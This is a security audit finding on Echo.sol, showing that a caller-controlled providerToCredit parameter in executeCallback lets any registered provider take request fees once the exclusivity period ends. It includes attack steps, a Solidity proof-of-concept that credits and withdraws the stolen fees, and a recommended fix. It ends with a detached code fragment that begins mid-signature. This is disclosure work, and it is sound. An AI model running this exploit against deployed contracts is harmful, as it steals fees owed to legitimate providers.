### Title
Caller-Controlled `providerToCredit` in `executeCallback` Allows Fee Theft After Exclusivity Period — (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary
In `Echo.sol`, the `executeCallback` function accepts a caller-controlled `providerToCredit` parameter that determines which provider's accrued-fee balance receives the request fee. After the exclusivity window expires, no validation ties `providerToCredit` to `msg.sender` or to the original `req.provider`. An unprivileged attacker who has pre-registered as a provider can call `executeCallback` with their own provider address as `providerToCredit`, redirecting the fee that was paid by the user for the original provider to themselves.

---

### Finding Description

When a user calls `requestPriceUpdatesWithCallback`, the fee they pay is split:

```solidity
// Echo.sol line 84, 99
req.fee = SafeCast.toUint96(msg.value - _state.pythFeeInWei);
_state.accruedFeesInWei += _state.pythFeeInWei;
```

`req.fee` (the provider's portion) is stored on the request object and is meant to compensate `req.provider`.

When `executeCallback` is later called, the fee is credited to the caller-supplied `providerToCredit`:

```solidity
// Echo.sol lines 161-162
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

The only guard on `providerToCredit` is the exclusivity check:

```solidity
// Echo.sol lines 114-121
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
```

Once `block.timestamp >= req.publishTime + exclusivityPeriodSeconds`, this guard is skipped entirely. There is **no check** that `providerToCredit == msg.sender` or that `providerToCredit == req.provider`. Any caller may pass any address.

An attacker who has pre-registered as a provider (permissionless via `registerProvider`) and set themselves as fee manager (via `setFeeManager`) can:

1. Monitor pending requests.
2. Wait for the exclusivity period to elapse.
3. Call `executeCallback(attacker_provider_address, sequenceNumber, updateData, priceIds)`.
4. `req.fee` is credited to `attacker_provider_address` instead of `req.provider`.
5. Call `withdrawAsFeeManager(attacker_provider_address, amount)` to extract the ETH.

This is structurally identical to the FuroStream bug: funds that should flow to one party (the original provider / the contract) are instead routed to an attacker-controlled address because the destination is an unvalidated parameter.

---

### Impact Explanation

- The original provider (`req.provider`) loses the fee they earned for being assigned to the request.
- The attacker gains the fee without having been the assigned provider.
- Users still receive their price-feed callbacks (the callback is executed regardless), so there is no direct user fund loss, but the provider incentive mechanism is broken.
- If the attacker front-runs every post-exclusivity fulfillment, all provider revenue can be drained to the attacker.
- Financial loss is bounded per-request by `req.fee`, but is unbounded in aggregate across all requests.

---

### Likelihood Explanation

- `registerProvider` is permissionless; any EOA can become a provider.
- `setFeeManager` is callable by any registered provider for their own record.
- The exclusivity period is a configurable admin parameter (`setExclusivityPeriod`); a short or zero period makes every request immediately exploitable.
- The attack requires only monitoring the chain for active requests and submitting a transaction after the exclusivity window — no special privilege, no leaked key, no governance majority.
- The attacker bears only gas costs and the Pyth oracle fee (`pythFee`), which is subtracted from the credited amount.

---

### Recommendation

Validate that `providerToCredit` equals `msg.sender` when the exclusivity period has elapsed, so only the actual transaction sender can claim the fee:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(providerToCredit == req.provider,
        "Only assigned provider during exclusivity period");
} else {
    require(providerToCredit == msg.sender,
        "providerToCredit must be the caller");
}
```

Alternatively, remove the `providerToCredit` parameter entirely and always use `msg.sender` as the credit recipient.

---

### Proof of Concept

```solidity
// Attacker setup (one-time, permissionless)
echo.registerProvider(0, 0, 0);          // register attacker as provider
echo.setFeeManager(attacker);            // attacker is own fee manager

// --- Normal user request ---
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    legitimateProvider, publishTime, priceIds, gasLimit
);
// req.fee = fee - pythFeeInWei  (owed to legitimateProvider)

// --- After exclusivity period ---
vm.warp(publishTime + exclusivityPeriod + 1);

// Attacker calls executeCallback, crediting themselves
echo.executeCallback(
    attacker,          // <-- providerToCredit = attacker, not legitimateProvider
    seq,
    updateData,
    priceIds
);
// _state.providers[attacker].accruedFeesInWei += req.fee (minus pythFee)

// Attacker withdraws
echo.withdrawAsFeeManager(attacker, stolenAmount);
// attacker.balance increases by stolenAmount
// legitimateProvider.accruedFeesInWei unchanged (never credited)
```

        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
    }
